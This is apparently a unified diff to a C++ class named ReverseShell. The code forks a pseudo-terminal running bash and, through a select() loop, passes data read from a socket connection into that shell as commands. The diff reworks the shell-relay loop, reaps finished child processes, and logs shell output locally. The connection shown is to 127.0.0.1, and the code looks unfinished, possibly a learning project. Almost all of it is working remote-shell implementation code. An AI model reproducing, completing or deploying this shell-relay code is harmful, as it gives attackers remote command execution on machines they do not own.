@@ -4,11 +4,13 @@
 #include <signal.h>
 #include <util.h>
 #include <list>
+#include <sys/select.h>
 
 ReverseShell::ReverseShell(void)
 {
-	Connection			c("127.0.0.1");
-	std::list< std::pair< pid_t, int > >	clientPids;
+	Connection								c("127.0.0.1");
+	std::list< std::pair< pid_t, int > >	clientProcesses;
+	int										status;
 
 	c.Bind();
 
@@ -26,54 +28,93 @@ ReverseShell::ReverseShell(void)
 			exit(0);
 		}
 
-		clientPids.push_back(std::pair< pid_t, int >(pid, serverSocket));
+		clientProcesses.push_back(std::pair< pid_t, int >(pid, serverSocket));
 
-		//TODO: check if there are dead processes in the pid list and remove them + close their socket
+		for (const auto p : clientProcesses)
+			if (waitpid(std::get< 0 >(p), &status, WNOHANG) > 0)
+				close(std::get< 1 >(p));
 	}
-}
-
-ReverseShell::~ReverseShell(void)
-{
-	std::cout << "Destructor of ReverseShell called" << std::endl;
 }
 
 void		ReverseShell::_RunShell(int serverSocket) noexcept
 {
-	char	cmd[0xF00];
 	pid_t	shellPid;
 	int		shellFd;
-	int		status;
-
-	printf("server: %i\n", serverSocket);
+	fd_set	read_fds;
+	fd_set	active_fds;
 
 	if ((shellPid = forkpty(&shellFd, NULL, NULL, NULL)) == 0)
 	{
 		setsid();
-		exit(execl("/bin/zsh", "zsh", NULL));
+		exit(execl("/bin/bash", "bash", NULL));
 	}
+
+	std::cout << "shellFd: " << shellFd << "\n";
+	std::cout << "shellFd: " << serverSocket<< "\n";
+
+	FD_ZERO(&active_fds);
+	FD_SET(serverSocket, &active_fds);
+	FD_SET(shellFd, &active_fds);
 
 	while (42)
 	{
-		int r = read(serverSocket, cmd, sizeof(cmd));
+		read_fds = active_fds;
 
-		if (r <= 0)
-		{
-			std::cout << "read return: " << r << std::endl;
+		if (select(FD_SETSIZE, &read_fds, NULL, NULL, NULL) < 0)
+			std::cout << "select: " << strerror(errno) << std::endl, exit(-1);
 
-			if (r != 0)
-				perror("read");
+		for (int i = 0; i < FD_SETSIZE; i++)
+			if (FD_ISSET(i, &read_fds))
+			{
+				if (i == serverSocket)
+					_ReadFromServer(shellPid, shellFd, serverSocket);
+				else
+					_ReadFromShell(shellFd);
+			}
 
-			close(serverSocket);
 
-			kill(shellPid, SIGKILL);
-			waitpid(shellPid, &status, 0);
-			exit(-1);
-		}
-
-		cmd[r] = 0;
-
-		write(shellFd, cmd, r);
 	}
+}
+
+void		ReverseShell::_ReadFromServer(int shellPid, int shellFd, int serverSocket) noexcept
+{
+	char	cmd[0xF00];
+	long	r;
+	int		status;
+
+	r = read(serverSocket, cmd, sizeof(cmd));
+
+	if (r <= 0)
+	{
+		if (r != 0)
+			perror("read");
+
+		close(serverSocket);
+
+		kill(shellPid, SIGKILL);
+		waitpid(shellPid, &status, 0);
+		exit(0);
+	}
+
+	write(shellFd, cmd, r);
+}
+
+void		ReverseShell::_ReadFromShell(int shellFd) noexcept
+{
+	char	output[0xF00];
+	long	r;
+
+	r = read(shellFd, output, sizeof(output));
+
+	if (r == -1)
+	{
+		perror("read");
+		return ;
+	}
+
+	output[r] = 0;
+
+	std::cout << "output: [" << output << "]" << ", length: " << r << std::endl;
 }
 
 std::ostream &	operator<<(std::ostream & o, ReverseShell const & r)
